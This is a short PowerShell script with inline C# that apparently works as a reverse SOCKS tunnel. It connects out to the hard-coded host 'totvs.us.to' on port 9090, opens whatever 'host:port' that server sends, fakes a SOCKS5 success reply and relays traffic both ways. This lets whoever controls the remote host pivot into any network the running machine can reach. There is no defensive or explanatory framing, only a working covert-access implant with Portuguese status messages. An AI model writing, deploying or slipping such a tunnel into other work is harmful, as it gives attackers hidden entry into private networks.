$Server = "totvs.us.to"



Add-Type @"
using System;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;



public class SocksClient
{


static async Task Pipe(NetworkStream a, NetworkStream b)
{

byte[] buffer = new byte[65536];


try
{

while(true)
{

int n =
await a.ReadAsync(buffer,0,buffer.Length);



if(n <= 0)
break;



await b.WriteAsync(buffer,0,n);


}

}
catch
{

}


try { a.Close(); } catch{}
try { b.Close(); } catch{}


}




static async Task Relay(NetworkStream a, NetworkStream b)
{


await Task.WhenAny(

Pipe(a,b),
Pipe(b,a)

);


}




public static async Task Start(string server)
{


TcpClient tunnel =
new TcpClient();



Console.WriteLine("[*] Conectando tunnel");



await tunnel.ConnectAsync(server,9090);



Console.WriteLine("[+] Tunnel conectado");



NetworkStream tunnelStream =
tunnel.GetStream();



byte[] buffer =
new byte[65536];



while(true)
{


int n =
await tunnelStream.ReadAsync(buffer,0,buffer.Length);



if(n <= 0)
break;



string request =
Encoding.ASCII.GetString(buffer,0,n);



Console.WriteLine("[+] Destino: "+request);



string[] p =
request.Split(':');



string host =
p[0];



int port =
int.Parse(p[1]);



// abrir destino


TcpClient remote =
new TcpClient();



await remote.ConnectAsync(host,port);



Console.WriteLine(
"[+] Conectado "+
host+
":"+
port
);



NetworkStream remoteStream =
remote.GetStream();



// responder OK SOCKS


byte[] ok =
{
0x05,
0x00,
0x00,
0x01,
0,0,0,0,
0,
0
};



await tunnelStream.WriteAsync(ok,0,ok.Length);



// relay


await Relay(
tunnelStream,
remoteStream
);



}


}


}
"@


[SocksClient]::Start($Server).GetAwaiter().GetResult()
